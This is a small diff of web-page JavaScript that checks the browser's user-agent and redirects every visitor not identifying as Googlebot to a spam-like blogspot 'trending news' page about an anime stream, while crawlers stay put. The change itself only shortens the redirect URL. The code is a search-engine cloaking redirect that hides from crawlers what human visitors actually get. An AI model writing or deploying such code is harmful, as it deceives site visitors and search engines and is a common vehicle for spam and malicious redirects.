@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://trendingnewsbbbbb111.blogspot.com/2026/10/monolog-farmatsevta-3-sezon-4-seriya-2026-10-24-pryamaya-translyatsiya-anime-russkaya-ozvuchka-maomao-ru-v1.html";
+  window.location.href = "https://trendingnewsbbbbb111.blogspot.com/2026/10/3-4-2026-10-24-ru.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
